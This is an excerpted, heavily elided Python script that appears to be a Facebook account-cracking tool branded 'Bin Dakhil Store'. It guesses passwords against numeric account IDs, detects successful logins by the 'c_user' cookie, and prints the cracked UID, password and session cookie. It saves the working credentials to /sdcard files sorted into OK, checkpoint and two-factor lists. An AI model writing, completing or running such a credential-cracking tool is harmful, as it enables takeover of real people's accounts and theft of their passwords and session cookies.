...
os.system('am start https://www.facebook.com/profile.php?id=100069125622672')
...
try:
    ...
    os.system("xdg-open https://www.facebook.com/profile.php?id=100069125622672")
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/qXC2WpcZ").text
...

  ...
  AUTHOR   :   Bin Dakhil Store
  FACEBOOK :   Bin Dakhil Store
  GITHUB    :   #####
  LIFE STATUS  :   Bin Dakhil Store
  FB GROUP  : Bin Dakhil Store0001
  TOOL STATUS :  #####                         
\033[1;91m=========================================================="""
...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m  Bin Dakhil Store   \033[0;m] ')
    print(f"")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m Bin Dakhil Store  \033[0;m]")
    print(f"")
    linex()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[Bin Dakhil Store-OK😁]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/Bin Dakhil Store-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[Bin Dakhil Store-CP😭]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/Bin Dakhil Store-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/Bin Dakhil Store-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[Bin Dakhil Store ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
